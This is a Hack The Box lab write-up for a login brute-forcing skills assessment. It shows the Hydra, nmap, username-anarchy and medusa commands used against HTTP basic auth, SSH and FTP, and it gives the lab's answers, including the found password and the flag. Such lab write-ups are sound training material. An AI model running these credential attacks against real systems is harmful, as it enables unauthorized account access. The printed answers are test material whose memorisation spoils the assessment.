---
platform: hackthebox
difficulty: unknown
status: Completed
date: 2026-10-19
tags:
---
# HTB: Login Brute Forcing Skills Assessment Part 1 & 2

**Targets:** 
Part 1:
`154.57.164.64:31919`

Part2:
`154.57.164.78:33535`

---

## 01 - Scope
### Assignment:
#### Part 1
The first part of the skills assessment will require you to brute-force the target instance. Successfully finding the correct login will provide you with the username you will need to start Skills Assessment Part 2.

You might find the following wordlists helpful in this engagement: [usernames.txt](https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt) and [passwords.txt](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt)

#### Part 2
This is the second part of the skills assessment. `YOU NEED TO COMPLETE THE FIRST PART BEFORE STARTING THIS`. Use the username you were given when you completed part 1 of the skills assessment to brute force the login on the target instance.

### Objectives:
- **Primary Goals:**
  - [x] What is the password for the basic auth login?
`Admin123`
  - [x] After successfully brute forcing the login, what is the username you have been given for the next part of the skills assessment?
  `satwossh`
  - [x] What is the username of the ftp user you find via brute-forcing?
  `thomas`
  - [x] What is the flag contained within flag.txt
  `HTB{brut3f0rc1ng_succ3ssful}`

---

## 02 - Procedure
1. The mainpage immediately prompts for credentials, the authentication takes place in the root directory `/` and we are dealing with a `GET` request:
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261019084749.png)
2. Sot lets try to bruteforce the credentials using `Hydra` and the mentioned username and password lists:
```bash
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/Common-Credentials/2023-200_most_used_passwords.txt  154.57.164.64 -s 31919 http-get /
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261019084539.png)

3. Alright and like that `Part 1` is complete:
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261019084904.png)

4. The obtained username `satwossh` is pointing towards `SSH`. Therefore lets confirm if it is open:
```bash
nmap -p 33535 -sC -sV 154.57.164.78
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261019091359.png)

5. Alright, lets try to bruetforce it again with `Hydra`:
```bash
hydra -l satwossh -P /usr/share/seclists/Passwords/Common-Credentials/2023-200_most_used_passwords.txt -f ssh://154.57.164.78 -s 33535
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261019091730.png)

6. Bingo! Let's connect and see, what we can discover
```bash
ssh satwossh@154.57.164.78 -p 33535
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261019092045.png)

7. The file `IncidentReport.txt` is referring to a user named `Thomas Smith`. Hence let's create a username list with `username-anarchy` ...
```bash
./username-anarchy Thomas Smith > thomas.txt
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261019092802.png)
...and bruteforce the `FTP` service on localhost:
```bash
medusa -h 127.0.0.1 -U username-anarchy/thomas.txt -P passwords.txt -M ftp -t 5
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261019093424.png)

8. So let's login with the found credenitals and capture the flag:
```bash
ftp  thomas@127.0.0.1
```
![](/00-Meta/Objects/Pictures/Pasted%20image%2020261019093719.png)

## 10 - Lesson Learned
Bruteforcing can be pretty versatile.